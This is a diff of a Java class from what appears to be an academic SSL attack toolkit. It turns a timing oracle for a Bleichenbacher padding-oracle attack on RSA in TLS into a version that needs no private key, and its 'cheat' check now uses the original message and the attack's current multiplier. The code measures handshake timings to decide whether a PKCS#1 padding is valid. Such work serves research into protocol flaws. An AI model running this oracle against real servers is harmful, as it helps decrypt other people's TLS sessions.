@@ -1,5 +1,10 @@
+/*
+ * To change this template, choose Tools | Templates
+ * and open the template in the editor.
+ */
 package de.rub.nds.ssl.attacker.bleichenbacher.oracles;
 
+import de.rub.nds.ssl.attacker.bleichenbacher.BleichenbacherBigIP;
 import de.rub.nds.ssl.attacker.bleichenbacher.OracleException;
 import de.rub.nds.ssl.attacker.bleichenbacher.OracleType;
 import de.rub.nds.ssl.attacker.misc.CommandLineWorkflowExecutor;
@@ -7,6 +12,7 @@ import de.rub.nds.ssl.attacker.misc.PKCS15Toolkit;
 import de.rub.nds.ssl.attacker.misc.Utility;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.math.BigInteger;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.security.interfaces.RSAPrivateKey;
@@ -22,30 +28,27 @@ import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 
 /**
- * Stripped down version of the Timing Oracle.
  *
- * @author Christopher Meyer - christopher.meyer@rub.de
+ * @author Juraj Somorovsky - juraj.somorovsky@rub.de
  * @version 0.1
- *
- * Jun 27, 2013
  */
-public class CommandLineTimingOracle extends AOracle {
+public class CommandLineTimingOracleWithoutPrivateKey extends AOracle {
 
     /*
      * CONFIGURATION SECTION
      */
     /**
-     * The timing boundary between PKCS-valid and PKCS-invalid timings (in clock ticks)
+     * The timing boundary between PKCS-valid and PKCS-invalid timings (in clock
+     * ticks)
      */
     private static final int TIMING_BOUNDARY = -11000;
     /**
      * Given a timing measurement > TIMING_BOUNDARY, we repeat the measurement
-     * with the same ciphertext. We'll keep repeating the measurement as long
-     * as the timings t are
-     * TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD < t < TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD
+     * with the same ciphertext. We'll keep repeating the measurement as long as
+     * the timings t are TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD < t <
+     * TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD
      */
     private static final int TIMING_SIGNIFICANCE_THRESHOLD = 3000;
-    
     /**
      * Amount of training measurements per Oracle request.
      */
@@ -81,7 +84,6 @@ public class CommandLineTimingOracle extends AOracle {
      * List of invalid timings.
      */
     private ArrayList<Long> invalidTimings = new ArrayList<>(TRAINING_AMOUNT);
-
     /**
      * Cipher (needed for the cheat operation).
      */
@@ -107,7 +109,6 @@ public class CommandLineTimingOracle extends AOracle {
      * Round counter - trick to speed up finding:
      */
     private int round = 0;
-    
     /**
      * Status counter to find the amount of errors the TimingOracle caused. The
      * format is {groundTruth}_{timingOracle}
@@ -116,9 +117,21 @@ public class CommandLineTimingOracle extends AOracle {
     private int valid_invalid = 0;
     private int invalid_valid = 0;
     private int invalid_invalid = 0;
-    
-    CommandLineTimingOracle() {
-        
+    private byte[] originalMessage;
+    private BleichenbacherBigIP attacker;
+
+    /**
+     * Create a new instance of this object.
+     *
+     * @param type Oracle type.
+     * @param rsaPublicKey Public key of the server.
+     * @param command Command to be executed.
+     */
+    public CommandLineTimingOracleWithoutPrivateKey(
+            final RSAPublicKey rsaPublicKey, final String command) {
+        this.publicKey = rsaPublicKey;
+        this.blockSize = Utility.computeBlockSize(rsaPublicKey);
+        this.clwe = new CommandLineWorkflowExecutor(command);
     }
 
     /**
@@ -126,24 +139,18 @@ public class CommandLineTimingOracle extends AOracle {
      *
      * @param type Oracle type.
      * @param rsaPublicKey Public key of the server.
-     * @param rsaPrivateKey Private key of the server - needed for cheating.
      * @param command Command to be executed.
+     * @param original original message used to perform cheat
+     * @param oracleType oracle type
      */
-    public CommandLineTimingOracle(final OracleType type,
-            final RSAPublicKey rsaPublicKey,
-            final RSAPrivateKey rsaPrivateKey, final String command) {
+    public CommandLineTimingOracleWithoutPrivateKey(
+            final RSAPublicKey rsaPublicKey, final String command,
+            final byte[] original, final OracleType oracleType) {
         this.publicKey = rsaPublicKey;
-        this.oracleType = type;
         this.blockSize = Utility.computeBlockSize(rsaPublicKey);
-        try {
-            this.cipher = Cipher.getInstance("RSA/None/NoPadding");
-            this.cipher.init(Cipher.DECRYPT_MODE, rsaPrivateKey);
-        } catch (InvalidKeyException | NoSuchAlgorithmException |
-                NoSuchPaddingException ex) {
-            ex.printStackTrace();
-        }
-
         this.clwe = new CommandLineWorkflowExecutor(command);
+        this.originalMessage = original.clone();
+        this.oracleType = oracleType;
     }
 
     /**
@@ -153,7 +160,8 @@ public class CommandLineTimingOracle extends AOracle {
      * Crosby's box test.
      *
      * @param testPMS PKCS to be tested for validity.
-     * @param factor Set to 1 for the first run. Will be increased for further recursions.
+     * @param factor Set to 1 for the first run. Will be increased for further
+     * recursions.
      * @return True if the PKCS was a valid one or false otherwise.
      * @throws OracleException
      */
@@ -161,23 +169,23 @@ public class CommandLineTimingOracle extends AOracle {
             throws OracleException {
         long[] caseXTiming = new long[MEASUREMENT_AMOUNT * factor];
         long[] testTiming = new long[MEASUREMENT_AMOUNT * factor];
-        
+
         Random r = new Random();
 
         for (int i = 0; i < MEASUREMENT_AMOUNT * factor; i++) {
             clwe.executeClientWithPMS(getCase1PMS());
-            if((r.nextInt() % 2) == 0) {
+            if ((r.nextInt() % 2) == 0) {
                 caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
-                testTiming[i]  = clwe.executeClientWithPMS(testPMS);
+                testTiming[i] = clwe.executeClientWithPMS(testPMS);
             } else {
-                testTiming[i]  = clwe.executeClientWithPMS(testPMS);
+                testTiming[i] = clwe.executeClientWithPMS(testPMS);
                 caseXTiming[i] = clwe.executeClientWithPMS(getCase2PMS());
             }
         }
 
         Arrays.sort(caseXTiming);
         Arrays.sort(testTiming);
-        
+
         /* Now write it out to a file. */
 //        try {
 //            FileWriter fwCaseX = new FileWriter(round + "_caseX.csv", false);
@@ -197,12 +205,12 @@ public class CommandLineTimingOracle extends AOracle {
 //        } catch (IOException ex) {
 //            Logger.getLogger(CommandLineTimingOracle.class.getName()).log(Level.SEVERE, null, ex);
 //        }
-        
+
         System.out.println("    timing: " + (caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100]));
         long timing = caseXTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100] - testTiming[(minBoxPos * MEASUREMENT_AMOUNT) / 100];
-        
-        if(factor == 1) {
-            if(timing > TIMING_BOUNDARY) {
+
+        if (factor == 1) {
+            if (timing > TIMING_BOUNDARY) {
                 /*
                  * We found a candidate! Repeat measurement to confirm it.
                  */
@@ -217,13 +225,13 @@ public class CommandLineTimingOracle extends AOracle {
             /*
              * We found a candidate in the previous round. Now lets confirm it.
              */
-            
+
             // -5900  >      -9000       +           3000
-            if(timing > (TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD)) {
+            if (timing > (TIMING_BOUNDARY + TIMING_SIGNIFICANCE_THRESHOLD)) {
                 return true;
-            
-            //        -12100 >   -9000          -   3000
-            } else if(timing < (TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD)) {
+
+                //        -12100 >   -9000          -   3000
+            } else if (timing < (TIMING_BOUNDARY - TIMING_SIGNIFICANCE_THRESHOLD)) {
                 return false;
             } else {
                 /*
@@ -231,11 +239,11 @@ public class CommandLineTimingOracle extends AOracle {
                  */
                 return isValidPKCS(testPMS, 10);
             }
-               
+
         }
-            
-        
-            
+
+
+
     }
 
     /**
@@ -286,7 +294,7 @@ public class CommandLineTimingOracle extends AOracle {
             ex.printStackTrace();
         }
     }
-    
+
     private void decryptAndPrintPKCS(final byte[] encPMS) {
         try {
             byte[] decPMS = cipher.doFinal(encPMS);
@@ -298,30 +306,31 @@ public class CommandLineTimingOracle extends AOracle {
         }
     }
 
-    @Override
     public boolean checkPKCSConformity(final byte[] testPMS)
             throws OracleException {
         boolean result = false;
         boolean groundTruth = false;
-        
+
         round += 1;
-        
+
         //if(round % 1000 == 0) {
         //    System.out.print("\r--> round " + round);
         //}
-        
+
         // if( (round < 2480) ) {
-            // TODO: Ooooh jeeeee!
-            // return groundTruth;
+        // TODO: Ooooh jeeeee!
+        // return groundTruth;
         //    return false;
         // }
-        
+
         System.out.println("");
         System.out.println("################### New Measurement #########################");
-        
-        groundTruth = cheat(testPMS);
-        
-        if((round % 20) == 0) {
+
+        groundTruth = cheat(attacker.getSi());
+
+        numberOfQueries++;
+
+        if ((round % 20) == 0) {
             System.out.println("###########################");
             System.out.println("# groundTruth_timingOracle");
             System.out.println("++      valid_valid:   " + valid_valid);
@@ -331,7 +340,6 @@ public class CommandLineTimingOracle extends AOracle {
             System.out.println("###########################");
         }
 
-        numberOfQueries++;
         boolean timingOracleAnswer = isValidPKCS(testPMS, 1);
 
         if (!groundTruth) {
@@ -352,7 +360,7 @@ public class CommandLineTimingOracle extends AOracle {
                         + "be valid. Under normal circumstances, the measurement is broken from now on.");
                 decryptAndPrintPKCS(testPMS);
                 System.out.flush();
-                
+
                 /*
                  * Kill the measurement with an exit code !=0 so that the caller
                  * knows that something went wrong
@@ -385,7 +393,7 @@ public class CommandLineTimingOracle extends AOracle {
                 result = timingOracleAnswer;
             }
         }
-        
+
         System.out.println("    " + round + ": Ground truth: " + groundTruth
                 + ", timingoracle: " + result);
 
@@ -395,19 +403,22 @@ public class CommandLineTimingOracle extends AOracle {
     /**
      * Cheat - needed to confirm a guess.
      *
-     * @param encryptedPMS Pre Master Secret.
+     * @param si
      * @return true if the PMS is valid, false otherwise
      */
-    public boolean cheat(final byte[] encryptedPMS) {
-        boolean result = false;
-        try {
-            byte[] decryptedPMS = cipher.doFinal(encryptedPMS);            
-            result = PKCS15Toolkit.conformityChecker(decryptedPMS,
-                    oracleType, blockSize);
-        } catch (BadPaddingException | IllegalBlockSizeException e) {
-            e.printStackTrace();
+    public boolean cheat(final BigInteger si) {
+        if (originalMessage == null) {
+            throw new RuntimeException("not initialized with an original message");
         }
-
+        boolean result = false;
+        BigInteger tmp = new BigInteger(originalMessage).multiply(si);
+        tmp = tmp.mod(publicKey.getModulus());
+        byte[] decryptedPMS = tmp.toByteArray();
+        result = PKCS15Toolkit.conformityChecker(decryptedPMS,
+                oracleType, blockSize);
+        if (result) {
+            System.out.println("cheat result: " + Utility.bytesToHex(decryptedPMS));
+        }
         return result;
     }
 
@@ -429,10 +440,10 @@ public class CommandLineTimingOracle extends AOracle {
     public void setCase1PMS(final byte[] valid) {
         this.case1PMS = valid.clone();
     }
-    
 
     /**
      * Get the valid encrypted PMS.
+     *
      * @return Valid PKCS encoded, encrypted PMS
      */
     public byte[] getCase2PMS() {
@@ -441,6 +452,7 @@ public class CommandLineTimingOracle extends AOracle {
 
     /**
      * Set the valid encrypted PMS.
+     *
      * @param valid Valid PKCS encoded, encrypted PMS to set
      */
     public void setCase2PMS(final byte[] case2PMS) {
@@ -464,5 +476,9 @@ public class CommandLineTimingOracle extends AOracle {
      */
     public void setCase3PMS(final byte[] invalid) {
         this.case3PMS = invalid.clone();
+    }
+
+    public void setAttacker(BleichenbacherBigIP attacker) {
+        this.attacker = attacker;
     }
 }
